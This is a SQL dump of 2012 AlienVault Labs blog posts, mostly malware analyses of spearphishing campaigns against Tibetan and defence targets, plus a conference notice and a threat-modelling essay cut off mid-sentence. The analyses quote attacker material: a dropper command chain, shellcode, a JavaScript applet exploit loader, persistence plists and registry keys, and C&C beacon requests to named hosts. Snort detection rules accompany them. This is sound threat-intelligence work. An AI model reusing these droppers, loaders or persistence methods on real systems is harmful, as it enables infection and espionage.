INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (103, 'MSUpdater Trojan found using CVE-2012-0158: Space and Missile Defense Conference', 'Jaime Blasco', 'April 23, 2012 ', 'The number of samples exploiting CVE-2012-0158 has been growing since we reported some of the first infections last week. We have been detecting several ongoing campaigns against several industries. One of the campaigns which attracted our attention is targeting the military and aerospace industry.Some of the documents sent to the victims have still a low antivirus detection. For example, one of the files sent is called “SMD_Conference_2012.doc”.https://www.virustotal.com/file/b2b2091ed7d211b713353affa7e4e6585ae8abbbc8fc3eede74d0c93f39a7f6b/analysis/When the victim opens the malicious document, the shellcode drops the malware and a benign office file, then it executes the dropped binary and shows the office file:cmd /c echo MZ>log1.txt && cmd /c copy /b log1.txt+fabc.scr abc.scr && cmd /c abc.scr && cmd /c del log1.txt && cmd /c del fabc.scrcmd /c SMD_Conference2012.docSo the victim will show the following document:The binary created by the shellcode is a dropper that contains the actual malware embedded on a resource. After deciphering the content, it creates the new binary under \\Documents and Settings\\{UserName}\\Local Settings\\Application Data\\GoogleUpdate.exe and creates the following registry key in order to maintain persistence:\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUNGoogleUpd SZ \\“C:\\\\Documents and Settings\\\\Joe Maldive\\\\Local Settings\\\\Application Data\\\\GoogleUpdate.exe\\”The payload is detected as BKDR_FYNLOS.SM1 and has been used in order similar attacks in the past. The malware connects to the  C&C server with address 204.13.66.119.The following HTTP request is sent to the C&C server:GET /search54615?h1=51&h2=1&h3=fh17952&h4=FNFACAADHFBCEIFJFEFGFAAA HTTP/1.1Accept: */*User-Agent: Mozilla/5.0 (compatible;AEAFAKEBFDENBMECAOAHFCAEABBDEJ;)Host: 204.13.66.119Connection: Keep-AliveThe values sent are the operating system version (5.1 = Windows XP), the encoded serial number of the machine and the encoded version of the machine name.It seems to be a version of the trojan called MSUpdater that was described by Zscaler a few months ago.  Once again the group behind these attacks are using conference related subjects as a lure to target these industries.You can use the following snort rule already present on Emerging Threats to detect the C&C traffic:alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“ET TROJAN Win32/Cryptrun.B/MSUpdater C&C traffic 1”; flow:from_client,established; content:”/search”; http_uri; content:”?h1=”; fast_pattern; http_uri; content:”&h2=”; distance:0; http_uri; content:”&h3=”; distance:0; http_uri; content:“User-Agent|3a| Mozilla/5.0 (compatible|3B|”; http_header; reference:url,blog.9bplus.com/kim-jong-il-pdf-malware; reference:url,www.seculert.com/reports/MSUpdaterTrojanWhitepaper.pdf; reference:url,research.zscaler.com/2012/01/msupdater-trojan-and-link-to-targeted.html; reference:url,blog.seculert.com/2012/01/msupdater-trojan-and-conference-invite.html; classtype:trojan-activity; sid:2014174; rev:4;)', 'malwareaptcve-2012-0158msupdater', '/blogs/labs-research/msupdater-trojan-found-using-cve-2012-0158-space-and-missile-defense-confer');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (104, 'CVE-2012-0158, Tibet, Targeted Attacks and so on', 'Jaime Blasco', 'April 18, 2012 ', 'As our friends at TrendMicro reported a couple of days agoÂ that CVE-2012-0158 is being actively used on different spearphishing campaigns mainly against NGO’s and Tibet related organizations.The vulnerability used was patched by Microsoft a week ago:The (1) ListView, (2) ListView2, (3) TreeView, and (4) TreeView2 ActiveX controls in MSCOMCTL.OCX in the Common Controls in Microsoft Office 2003 SP3, 2007 SP2 and SP3, and 2010 Gold and SP1; Office 2003 Web Components SP3; SQL Server 2000 SP4, 2005 SP4, and 2008 SP2, SP3, and R2; BizTalk Server 2002 SP1; Commerce Server 2002 SP4, 2007 SP2, and 2009 Gold and R2; Visual FoxPro 8.0 SP1 and 9.0 SP2; and Visual Basic 6.0 Runtime allow remote attackers to execute arbitrary code via a crafted (a) web site, (b) Office document, or (c) .rtf file that triggers “system state” corruption, as exploited in the wild in April 2012, aka “MSCOMCTL.OCX RCE Vulnerability.”We have found several targeted RTF doc files dropping different trojans and RATs onto the victims. One of the malicious doc files is very similar to what TrendMicro described a couple of days ago but it shows how quick the attackers are adapting their code to what security companies release in order to avoid signature and AV detection.Once you open the RTF document, it drops the malicious executable as well as a benign doc file:Immolation Statement.doc\nThe dropped exe file has a low AV detection rate:https://www.virustotal.com/file/b7c6522ce21bd230c33e3f250d9789395af932e7fc72c9e0c1304c0bbcaa5e61/analysis/1334789684/\nhttps://www.virustotal.com/file/eb6901caaf90e7e04b5c79d33aaa4aa3f3139cfb179418f78555e0c724b9e09f/analysis/1334790589/\nAnd more interesting is that it is digitally signed, apparently using the same signer described by TrendMicro but this time the certificate is valid and it has been signed the 16th.The trojan connects to the following domains:1.test.3322.org.cn -> 64.62.224.752.test.3322.org.cn -> 74.82.63.1023.test.3322.org.cn -> 74.82.63.1024.test.3322.org.cn -> 64.62.224.75123ewqasdcxz.xicp.net, now pointing to 0.0.0.0hoop-america.oicp.net -> 222.132.195.5We have collected several documents/mails exploitingÂ CVE-2012-0158 and will publish more information about the ongoing campaigns. Stay tuned!', 'malwarecve-2012-0158tibettargeted attacks', '/blogs/labs-research/cve-2012-0158-tibet-targeted-attacks-and-so-on');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (105, 'Mac OS X trojan encryption routines found in a Linux backdoor', 'Jaime Blasco', 'March 28, 2012 ', 'We were working on some information related to the C&C protocol used on the http://labs.alienvault.com/labs/index.php/2012/alienvault-research-used-as-lure-in-targeted-attacks/ [no longer available] Mac OS X trojan we discovered last week. ESET already did a great job http://blog.eset.com/2012/03/28/osxlamadai-a-the-mac-payload [no longer available]and you can read all the information there. As ESET said, the C&C protocol is using AES and XOR to encrypt all the underlying communications. For the XOR cypher they are using hardcoded keys:They also add a SHA1 hash to every packet to authenticate and check the integrity of the communication.So based on the encryption method, we have found another backdoor that uses the same underlying encryption with the same keys on a Linux backdoor that has been around at least since lately 1999 (based on VirusTotal submissions).This can indicate that they are taking advantage of some code published in some underground forums or maybe the same guys have been using this backdoor to maintain persistence on Linux systems.The file in question is this one:https://www.virustotal.com/file/a3ffc25db2403b3f70719b151b106e53b3abbf1f81c9147a40664605b5b573d7/analysis/The backdoor:- It check first that has enough privileges to run (it requires root privileges).- Then it writes the PID number to a file under /dev/hdsmat.- Forks the process and change the process name to ‘-bash’.- Opens a raw socket, SOCKET (PF_INET, SOCK_RAW, IPPROTO_TCP)- This is some kind of portknocking technique so it waits for a packet that contains the following string:- Once it receives that packet, it opens a connection to the machine that sent the pack using port 3133.- The following communication will use the same XOR/AES underlying encryption to exchange data.Based on a post published lately last year, it seems that they found a similar backdoor that was uploaded to the system after a successful SSH bruteforcing attack. The backdoor they talk about doesn’t have the underlying encryption but it uses the same “portknocking” code.Maybe someone recognizes parts of this code and points us to an already know backdoor.', '', '/blogs/labs-research/mac-os-x-trojan-encryption-routines-found-in-a-linux-backdoor');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (106, 'MS Office exploit that targets MacOS X seen in the wild - delivers \"Mac Control\" RAT', 'Jaime Blasco', 'March 27, 2012 ', 'Continuing our research on Tibet attacks, we have found more Mac trojans and some interesting MS Office files that  deliver them. The group behind these attacks is the same we have been tracking for a while:- http://labs.alienvault.com/labs/index.php/2012/alienvault-research-used-as-lure-in-targeted-attacks/ [no longer available] AlienVault Tibet related Research now used to target Tibetan non-governmental organizationsThe doc files seem to exploit MS09-027 and target Microsoft Office for Mac. This is one of the few times that we have seen a malicious Office file used to deliver Malware on Mac OS X.http://technet.microsoft.com/en-us/security/bulletin/MS09-027A remote code execution vulnerability exists in the way that Microsoft Office Word handles a specially crafted Word file that includes a malformed record. An attacker who successfully exploits this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.When the victim opens the malicious Word file using Office for Mac, the shellcode writes the malicious payload on disk and executes it, and then opens a benign office file with the following content:The first stage copies the payload to the __IMPORT section of dyld using memcpy:push dword 0x1be #Payload sizepush edxpush dword 0x8fe6f318push dword 0x8fe6f318 ## dyld __IMPORT (rwx) mov ebx,0x8fe2e130 #memcpyjmp ebxThe second stage writes necessary files to /tmp/ (bash file, benign doc file, binary) and then executes the bash script (/tmp/launch-hs):fstat(0x2, 0xBFFF4CD0, 0x200)...fstat(0x24, 0xBFFF4CD0, 0x200)lseek(0x24, 0x6600, 0x0) #File Offset on the doc fileopen(”/tmp/launch-hs\\0”, 0x602, 0x1FF)open(”/tmp/launch-hse\\0”, 0x602, 0x1FF)open(”/tmp/file.doc\\0”, 0x602, 0x1FF)read(0x24, “#!/bin/sh\\n/tmp/launch-hse &\\nopen /tmp/file.doc &\\n\\n\\0”, 0x32)write(0x26, “#!/bin/sh\\n/tmp/launch-hse &\\nopen /tmp/file.doc &\\n\\n\\0”, 0x32) .........close(0x28)vfork()execve(0x28, 0xBFFF4B80, 0x0)Bash file: /tmp/launch-hs:#!/bin/sh /tmp/launch-hse & open /tmp/file.doc &A couple of doc files drop the previous Mac Trojan we reported last week.The only difference is the .pslist used:<?xml version=“1.0” encoding=“UTF-8”?><!DOCTYPE plist PUBLIC “-//Apple Computer//DTD PLIST 1.0//EN” “http:// www.apple.com/DTDs/PropertyList-1.0.dtd”><plist version=“1.0”><dict><key>Label</key> <string>com.apple.docserver</string> <key>Program</key><string> /Applications/Automator.app/Contents/MacOS/DockLight </string><key>RunAtLoad</key><true/></dict></plist>The C&C server this time is:- 2012.slyip.net : 173.255.160.234173.255.160.128 - 173.255.160.255Black Oak Computers Inc - New York - 75 Broad StreetNew York, NY, USThe second trojan found is a new one never seen. We have found several versions compiled for different architectures (ppc, i386..) .We have also found a version that has paths to debugging symbols:/Developer/longgegeProject/Mac Control/MacControl V1.1.1/build/Foundation_Hello.build/ Release/Foundation_Hello.build/Objects-normal/ppc/Foundation_Hello.o/Developer/longgegeProject/Mac Control/MacControl V1.1.1/build/Foundation_Hello.build/ Release/Foundation_Hello.build/Objects-normal/i386/Foundation_Hello.oSo the group seems to have a project called “longgege” and the actual trojan is named “MacControl” by them.The trojan performs the following actions:- Copies itself into /Library/launched- Creates /Users/{User}/Library/LaunchAgents/com.apple.FolderActionxsl.pslistThis is the way to maintain persistence. The trojan will be executed when the computer starts.- It then reads the configuration parameters that are at the end of the binary file:- domain: freetibet2012.xicp.net - port: 80- Establishes a connection to the host present in the configuration parameters.-Sends some information about the victim, username, hostname, system version…   - The trojan will then wait for commands from the C&C.The attackers can then send commands to the victim to open a remote shell, send files, receive files, delete files….The C&C domain resolves to freetibet2012.xicp.net: 114.249.207.194114.240.0.0 - 114.255.255.255China Unicom Beijing province networkChina UnicomAll the samples we have found have 0/0 rate antivirus detection, it includes the malicious doc files.We will publish a technical analysis of the trojan capabilities and some tips to detect these threats. Stay tuned!Thanks to Rubén Santamarta @reversemode for his help during the analysis.', 'malwareaptmacosxofficetibetchina', '/blogs/labs-research/ms-office-exploit-that-targets-macos-x-seen-in-the-wild-delivers-mac-contro');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (107, 'AlienVault Tibet related Research now used to target Tibetan non-governmental organizations', 'Jaime Blasco', 'March 19, 2012 ', 'A few hours ago Greg Walton posted a warning on spearphishing mails sent to non-governmental organizations related to Tibet. The content of these emails is about our previous research Targeted Attacks against Tibetan organizations.—————Forwarded message—————From: webmaster <[email protected]>Date: Mon, Mar 19, 2012 at 8:20 AMSubject: Targeted attacks against Tibet organizationsTo: ......We recently detected several targeted attacks against Tibetan activist organizations including the CentralTibet Administration and International Campaign for Tibet, among others.Here is one of the emails detected:[ More information ]It contains a link to hxxp://dns.assyra.com/ that hosts a copy of our blog post but includes some Javascript:<script>var emb = document.createElement(‘applet’);emb.setAttribute(‘name’, ‘applet’);emb.setAttribute(‘width’, ‘1’);emb.setAttribute(‘height’, ‘1’);emb.setAttribute(‘code’, ‘Func1.class’);if (navigator.userAgent.indexOf(‘Win’) != -1){emb.setAttribute(\'archive\', \'default.jar\');}else if (navigator.userAgent.indexOf(‘Linux’) != -1){emb.setAttribute(\'archive\', \'index.jar\');}else if (navigator.userAgent.indexOf(‘Mac’) != -1){emb.setAttribute(\'archive\', \'index.jar\')}document.body.appendChild(emb);</script>The domain shenhuawg.com is also pointing to that server.Based on the user-agent (Mac or Windows) it loads a Java applet that exploits CVE-2011-3544.https://www.virustotal.com/file/d4b394844e8357a15bf6e76cb15db05a8b073b026a813d11e35211bb96caad52/analysis/1332192121/https://www.virustotal.com/file/13f596019477b51c311f19f9adc2e4f9628ad98df1a55db6c707521ed944ec90/analysis/The attack contains malware to infect both Windows and MacOSX.The MacOSX backdoor has 0/0 antivirus detection rate:https://www.virustotal.com/file/143969e8eaed6269ac6c55e2a861cdde81947e7c45e5d27e939d4bbb1c9ac8cd/analysis/1332184087/bash-3.2# nm -a file.tmpU ___errorU ___memcpy_chkU ___stack_chk_failU ___stack_chk_guardU ___strcat_chk0000000100000000 A __mh_execute_headerU _alarmU _closeU _connectU _creatU _dup2U _execlU _exitU _forkU _gethostbynameU _getpidU _getpwuidU _gettimeofdayU _getuidU _ioctlU _mallocU _memcmpU _memcpyU _memsetU _openU _openptyU _putenvU _randU _readU _recvU _select$1050U _sendU _setsidU _shutdownU _signalU _sleepU _socketU _strncpyU _ttynameU _waitpidU _writeU dyld_stub_binder0000000005614542 - 00 0000   OPT radr://5614542bash-3.2# otool -L file.tmpfile.tmp:/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 125.2.10)<?xml version=“1.0” encoding=“UTF-8”?><!DOCTYPE plist PUBLIC “-//Apple Computer//DTD PLIST 1.0//EN” “http://www.apple.com/DTDs/PropertyList-1.0.dtd”><plist version=“1.0”><dict><key>Label</key><string>com.apple.docserver</string><key>Program</key><string>/Library/Audio/Plug-Ins/AudioServer</string><key>RunAtLoad</key><true/></dict></plist>The trojan connects to the following server:dns.assyra.com (100.42.217.73)100.42.208.0 - 100.42.223.255530 W. 6th St Suite 701Los Angeles, CAUSThe domain assyra.com has been involved in several attacks during the past using Win32/Protux.The Windows payload is detected by AVG as BackDoor.Generic15.VKZhttps://www.virustotal.com/file/5513b45a4856f7941d71cf0885380469fdc22ece101d0399baabc9bd8b5536be/analysis/The Windows payload seems to have been created 6 days ago:It copies itself to  “C:\\WINDOWS\\system32\\2019\\svchost .exe” and modifies HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders -> Startup to maintain persistence.It connects to the following servers:tibet.zyns.com (100.42.217.73)100.42.208.0 - 100.42.223.255530 W. 6th St Suite 701Los Angeles, CAUSyahoo.xxuz.com (100.42.217.91)100.42.208.0 - 100.42.223.255530 W. 6th St Suite 701Los Angeles, CAUSlyle.changeip.org (100.42.217.73)100.42.208.0 - 100.42.223.255530 W. 6th St Suite 701Los Angeles, CAUSOnce it connects to one of the servers (port 8080) , it sends some information about the victim like the ComputerName using some obfuscation:You can use the following rule to catch this traffic on your network:alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:“MALWARE WUpdater checkin”; content:”|3C|html|3E||3C|title|3E|12356|3C||2F|title|3E||3C|body|3E|”; depth:33; classtype:trojan-activity; sid:11111111111111; rev:1;)We will publish more information about this and ongoing attacks as soon as we have more information. Stay tuned.Update: There is another sample of BackDoor.Generic15.VKZ (222a150bf0399f23af6d59f695304610) which used 11.36.214.140 as the C&C server. Check your logs!', '', '/blogs/labs-research/alienvault-tibet-related-research-now-used-to-target-tibetan-non-government');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (108, 'Targeted attacks against Tibet organizations', 'Jaime Blasco', 'March 13, 2012 ', 'We recently detected several targeted attacks against Tibetan activist organizations including the Central Tibet Administration and International Campaign for Tibet, among others. We believe these attacks originate from the same group of Chinese hackers that launched the âNitroâ attacks against chemical and defense companies late last year and are aimed at both spying on and stealing sensitive information about these organizationsâ activities and supporters.The attacks begin with a simple spear phishing campaign that uses a contaminated Office file to exploit a known vulnerability in Microsoft. The information in the spear phishing email is related to the Kalachakra Initiation, a Tibetan religious festival that took place in early January. After further investigation, we discovered that the malware being used in this attack is a variant of Gh0st RAT (remote access Trojan), a type of software that enables anything from stealing documents to turning on a victimâs computer microphone. Gh0st RAT was a primary tool used in the Nitro attacks last year and the variant we uncovered in these attacks seem to come from the same actors. Itâs likely that the same group is stealing from major industries as well as infiltrating organizations for political reasons.It is no surprise that Tibetan organizations are being targeted - they have been for years - and we continue to see Chinese actors breaking into numerous organizations with impunity. Unfortunately, in this particular case, these attacks may have a direct impact on the abuse of human rights in these regions.Below is a detailed analysis of one of the dozens of campaigns that weâve been tracking, which illustrates the method used by the attackers and the possible connection to the Nitro attacks.These latest attacks are linked to the Kalachakra Initiation, a Tibetan religious festival that took place in early January. The spear phishing emails are not that sophisticated and feature a Microsoft attachment (Â Camp information at Bodhgaya.doc) that exploits a known Office stack overflow vulnerability (CVE-2010-3333).Here is one of the mails detected:\nThe malicious document usesÂ a staged XOR loader, which then resolves imports by hashes (a common technique), with the embedded payload encrypted using a 256-byte XOR key. This allows the payload to obfuscate itself from most security systems andÂ software, including IDS appliances.To extract the embedded executable we have used a tool that we are writing (and we will release soon) that automatically tries to detect embedded executables on PDF/OFFICE files guessing XOR/ROL/ROR ciphers:jaimes-MacBook-Pro:test jaime$ python findexec.py tibet/Camp\\ information\\ at\\ Bodhgaya.doc OFFICEAnalyzing Office fileOne Byte distributionAverage 476Best Value 77 number of ocurrences 21565[‘w’]Best Value 77Performing XOR/ROLAverage Entropy 66.0Average 6Detected possible cyphered data on position 3072 of length 94208Best Val num ocurrences 256Guessed key length 256Calculating calculateOccurencesBySizeDonehFileBuffersSetFilePointerMCreateFileA?GetCPInfo?GetACP?GetOEMCP?GetProcAddressHLoadLibraryASetEndOfFile?ReadFilekMultiByteToWideChar:LCMapStringA;LCMapStringW?GeKey found 92adacafaea9a8abaaa5a4a7a6a1a0a3a2bdbcbfbeb9b8bbbab5b4b7b6b1b0b3b2cdcccfcec9c8cbcac5c4c7c6c1c0c3c2dddcdfded9d8 dbdad5d4d7d6d1d0d3d2edecefeee9e8ebeae5e4e7e6e1e0e3e2fdfcfffef9f8fbfaf5f4f7f6f1f0f3f20d0c0f0e09080b0a05040706010003 021d1c1f1e19181b1a15141716111013122d2c2f2e29282b2a25242726212023223d3c3f3e39383b3a35343736313033324d4c4f4e494 84b4a45444746414043425d5c5f5e59585b5a55545756515053526d6c6f6e69686b6a65646766616063627d7c7f7e79787b7a757477 76717073728d8c8f8e89888b8a85848786818083829d9c9f9e99989b9a95949796919093FoundFound executable at offset 1752File saved on 1329392127.exeJust for good measure, the malware is digitally signed, giving it an extra layer of authenticity - even though the certificate is valid as the root authority is not present on the Trusted Root Certification Authorities store of the computer.\nNB: The common name of `Root Agencyâ is often used during development to create temporary certificates.The file was detected only by two AV vendors:https://www.virustotal.com/file/b23333a2c1dbbf106bd9b185f6fe938883fe96e25bad071ae8bb05010ed4b194/analysis/\nThe binary drops a couple of files under:C:\\Documents and Settings\\Administrator\\temp.datC:\\WINDOWS\\fxsst.dllThe fileÂ fxsst.dll is also digitally signed but this time it is more interesting:The certificate was issued to “Qingdao Ruanmei Network Technology Co., Ltd.” by Verisign. Let’s get more information:\nWe check that the certificate has been revoked by VeriSign on 12th Dec:$ openssl crl -in CSC3-2010.crl -noout -text -inform DER|grep 6E1C4 -A1Serial Number: 6E1C43A41D4DDC805A8561C69CEDA182Revocation Date: Dec 12 06:13:08 2011 GMTThis file has 0/0 ratio on VirusTotal:https://www.virustotal.com/file/5df6084462bad851c6a7de5e73ebb61ef2679a02a5d66034eea923da3ba63438/analysis/\nThe file temp.dat is obfuscated but after deobfuscation we can see that a PE File is generated to inject it into svchost:\nTo extract the injected code, we run the malware and using “User Mode Process Dumper” we can get a copy of svchost on the infected host. Using WinDBG we can easily find the injected code and extract it.https://www.virustotal.com/file/41c865f2c419f3ee25fb87e79904a5b2a612d14d26bc435eb9436f0b18e60750/analysis/\nOnce injected, it will beacon the C&C using the following request (port 8080)[ GET / HTTP/1.0Accept: */*Accept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 6.0)Host: update.microsoft.com/windowsupdate/v7/default.aspx?ln=zh-cnConnection: Keep-Alive]Here is the list of C&C ips referenced:218.106.193.184 - China Unicom IP network218.61.72.178 - China Unicom Liaoning province network59.44.49.88 - CHINANET liaoning province networkWe can use this Snort rule to detect this kind of traffic:alert tcp any any -> any any (msg:“MALWARE WUpdater checkin”; content:”|20|GET”; depth:4; content:“Host|3a| update|2e|microsoft|2e|com”; distance:106; within:30; http_header; classtype:trojan-activity; sid:3000055; rev:1;)Unfortunately, we discovered that the port was not open on the hackerâs command-and-control server at the time of tests, but examining the code reveals that the sample is waiting to receive an obfuscated binary from the remote server and then load it on the system.Apart from the first spearphished message we mentioned and the beginning of the article, we detected other messages being sent:The exploit/shellcode is the same, using the tool we previously used we extract the payload:$ python findexec.py kalachakra32.doc OFFICEAnalyzing Office fileOne Byte distributionAverage 1181Best Value 77 number of ocurrences 21912[‘w’]Best Value 77Performing XOR/ROLAverage Entropy 77.0Average 7Detected possible cyphered data on position 3072 of length 273408Best Val num ocurrences 256Guessed key length 256Calculating calculateOccurencesBySizeDoneGetACPkMultiByteToWideCharInterlockedExchangeiGetLastError?lstrcmpiA?GetThreadLocaleHLoadLibraryANLocalAlloc?GetVersionExA?GetVersionRLocalFreeKLoadLibraryW?OutputDebugSKey found f20d0c0f0e09080b0a05040706010003021d1c1f1e19181b1a15141716111013122d2c2f2e29282b2a25242726212023223d3c3f3e39 383b3a35343736313033324d4c4f4e49484b4a45444746414043425d5c5f5e59585b5a55545756515053526d6c6f6e69686b6a65646 766616063627d7c7f7e79787b7a75747776717073728d8c8f8e89888b8a85848786818083829d9c9f9e99989b9a9594979691909 392adacafaea9a8abaaa5a4a7a6a1a0a3a2bdbcbfbeb9b8bbbab5b4b7b6b1b0b3b2cdcccfcec9c8cbcac5c4c7c6c1c0c3c2dddcdfded9d 8dbdad5d4d7d6d1d0d3d2edecefeee9e8ebeae5e4e7e6e1e0e3e2fdfcfffef9f8fbfaf5f4f7f6f1f0f3Found executable at offset 1752File saved on 1329479062.exehttps://www.virustotal.com/file/f2d33e730feba021b2f68ff5c224672fc984c4fb5cde718db6a5fd1fa6084d55/analysis/1329479226/The executable contains an gzip embedded resource:The resource is dropped and unzipped and contains the code for the service that will be installed on the system:\nThe service is then started using:C:\\WINDOWS\\system32\\rundll32.exe “C:\\Archivos de programa\\Archivos comunes\\Microsoft Shared\\Triedit\\5a1bcffe.dll”,ServiceEntry”During the infection, the executable writes a log file where we can check all the behaviour (DebugLog.log):.\\InstallerMFC.cpp-CInstallerMFCApp::InitInstance-56:Â  Â  Installer Hello!.\\InstallerMFC.cpp-CInstallerMFCApp::InitInstance-75:Â  Â  dwConfigDataSize = [40].\\InstallerMFC.cpp-CInstallerMFCApp::InitInstance-171:Â  Â  ReleaseResource done!.\\install.cpp-InstallSrvPlugin-51:Â  Â  InstallSrvPlugin!.\\install.cpp-InstallSrvPlugin-125:Â  Â  szHost = [218.106.193.184] szPort = [81].\\install.cpp-InstallSrvPlugin-261:Â  Â  Install Service by WinAPI!.\\install.cpp-InstallSrvPlugin-295:Â  Â  StartServiceEx!.\\SrvPlugin.cpp-ServiceMain-291:Â  Â  g_szServiceName = [5a1bcffe].\\SrvPlugin.cpp-ConnectClientThread-528:Â  Â  ConnectClientThread.\\SrvPlugin.cpp-ConnectClientThread-638:Â  Â  szHost = [218.106.193.184] szPort = [81]Before installing the service, the malware does some verifications in order to detect present AVs:Check for kisknl.sys (Kingsoft Antivirus)Look for KSafeTray.exe and disable it: OpenThread -> SuspendThreadCheck for TmComm.sys (TrendMicro)Check for HookPort.sys (QQ 360)Depending of the AV present use the native API to install the service or the following method:FindWindowA(“CabinetWClass”, WindowName);FindWindowExA(v15, 0, “WorkerW”, 0);SendMessageA, RegOpenKeyExA, SYSTEM\\\\CurrentControlSet\\\\Services\\\\The service then opens a connection to Â 218.106.193.184 (port 81) :Request:\nResponse:\nExamining the resultant traffic confirms the code to be a variant of the Gh0st RAT (remote access trojan) using a data string ofÂ  `BySheâ in place of the more usual `Gh0st.âSecurity admins can use the following rule(s) to detect the command-and-control IP traffic:alert tcp $HOME_NET any -> $EXTERNAL_NET 81,8000,53 (msg:“MALWARE ByShe outbound traffic detected”; flow:to_server,established; content:“ByShe”; depth:5; classtype:trojan-activity; sid:100000000000; rev:1)alert tcp $EXTERNAL_NET 81,8000,53Â -> $HOME_NET any (msg:“MALWARE ByShe inbound traffic detected”; flow:to_server,established; content:“ByShe”; depth:5; classtype:trojan-activity; sid:100000000000; rev:1)We have found more samples using this modified header (“ByShe”):http://www.threatexpert.com/report.aspx?md5=e4e64d365844dc7294e4a553fed7501fhttp://www.threatexpert.com/report.aspx?md5=4A35488762F70170DC0D3F46F94A7BCBIt is worth noting that the sample - 4a35488762f70170dc0d3f46f94a7bcb - connects to jericho.3322.org using the `ByShe’ protocol, which was seen during the Nitro attacks we saw between April and November of last year.This sample was used during theÂ NitroAttacksÂ Â last year, a targeted attack against chemical and defense companies that was traced to China. In the following weeks we will disclose more information about these attacks.', '', '/blogs/labs-research/targeted-attacks-against-tibet-organizations');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (109, 'Got a Question for the labs guys? Come Heckle us at RSA Booth 717 and Bsides', 'Conrad Constantine', 'February 25, 2012 ', 'So once Â again, the time to drink from the firehouse is upon us: RSA Conference 2012 and BSides San Francisco are a few short days away. This year is looking like it will be an event on monstrous proportions: 2011 was an exceptionally busy year for things of significance in the Infosec world and there’s no shortage of hot topics to discuss this year.Alienvault will be at Booth 717 this year, demonstrating out commitment to open community and open source again. We’re all insanely excited to be launching Open Threat Exchange and we’d love to hear your thoughts and anecdotes about your experiences with data sharing in the field. Even if you don’t have an OSSIM deployment, but you’re interested in possible collaboration, come chat with us.Once again, we’re a BSides sponsor this year (and I’m a staff volunteer for it): Â We love BSides because it gives the people without an established reputation a chance to share their experiences from working on the front lines of Infosec - this is where innovation in the field happens - by solving real problems, not serving market sectors.On thursday I (Conrad) will be talking on the RSA Briefings Track, about the values of open security intel and exchange, even with your competitors, as perhaps the only viable way we can raise the stakes in the economics of exploitation and make life easier for ourselves - addressing the issue that many organizations are still ‘beneath the security poverty line’ and how that weakens security for all of us.So come on by and find us at one of these two locations: Most of us will be wearing swanky new Alienvault shirts so we should be easy to spot in a crowd. We’re looking forward to a chance to chat.', '', '/blogs/labs-research/got-a-question-for-the-labs-guys-come-heckle-us-at-rsa-booth-717-and-bsides');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (110, 'If It\'s Stupid and it works, It\'s not Stupid!', 'Conrad Constantine', 'February 25, 2012 ', 'One of my favorite ways to explain threat-modelling to people outside the field, Â starts with a little humor:A martial arts instructor is teaching a new class; wanting to impress them with his flashy techniques, he picks upon the frailest-looking new student and instructs them to attack him…..the student, who has never been in an actual fight before, comes at the instructor, arms failing like windmills, his inneffective blows raining down on the instructor, who struggles to deflect them all.Â Eventually the instructor becomes annoyed, and finds himself backing away from the student, for fear of catching a random slap in the face from the chaotic attempt at attacking himThe teacher ends the exercise, regains his composure, and addresses the class:“So as you can see here, he made a common rookie mistake, and was attacking me incorrectly…”Many months later, the student learned to attack the teacher ‘correctly’, but never once did he manage to beat the teacher like he did on that first daySo far the world has not ended, giving us little indication that it will do so in the future…If I think back to all the debates and arguments I’ve had over my career in Infosecurity, one topic always seems to spring to mind as the source of the greater percentage of them: threat modelling. Let’s take a quick tally and see how many of these lines you have heard (or said yourself) before:“That weakness is non-trivial to exploit”“That exploit has never been seen in the wild”“That Protocol has never been compromised”“There’s never been a remote privilege escalation exploit for that”..does everyone have their hand raised yet? The human brain seems great at predicting future non-occurrenceÂ of things based on a historical trend of non-occurrence, a perceptual bias illustrated most clearly in Taleb’s Black Swan Theory, the idea that:an event is a surprise to the observer, has a major impact, and is rationalized after the factFor many of us in infosec, the black swan comes in the form of the “I hadn’t considered that kind of attack” moment.One of my favorite phrases about programming, is Brian Kernighan’s line: “Everyone knows that debugging is twice as hard as writing a program in the first place. So if you’re as clever as you can be when you write it, how will you ever debug it?”, which makes for a great maxim, boiled down to its essence:If you design it to the best of your ability, you are by definition incapable of finding the flaws in itBetween these two ideas, lays a terrible trap that I’ve seen a great number of Security Designers, Risk Managers and all manner of Information Security Personnel fall into; a kind of tunnel vision where Â they they focus on historical evidence as the sole indicator of future trends in the field, forgetting that:On a long enough timeline, everyone’s survival rate goes to zeroAnd although this pessimistic line from Fight Club seems like broad wisdom in the most meaningless sense, it’s worth pointing out that it is the rate of chance of survival over time, that is the important part (not that failure becomesÂ inevitable). My survival chances may still be great next year, but they’re likely lower than they were today.When designing systems, we core on the obvious requirements, and then set goals of delivering beyond expectations on those core requirements, while being merely adequate in secondary functions and aspects. When time comes to improve on the design, we tend to once again focus on the core functionality at the expense of the overall implementation and experience. When applied to Information Security, we have a design model that creates what Bruce Schneier once dubbed:”Iron Doors in Paper Walls’Â And yet every single one of us, instantly understands the wisdom of”The Chain is only as strong as its weakest link”The problem is, that most of us aren’t trained to see weakness in the first place: Unless the weakest link in that chain is obviously damaged, corroded, or has some other factor that forces it to stand out from the rest, it’s difficult to tell which link is the weakest, without direct destructive testing. As Links break, we may replace them with new links, yet still assume that the links that were the strongest when the 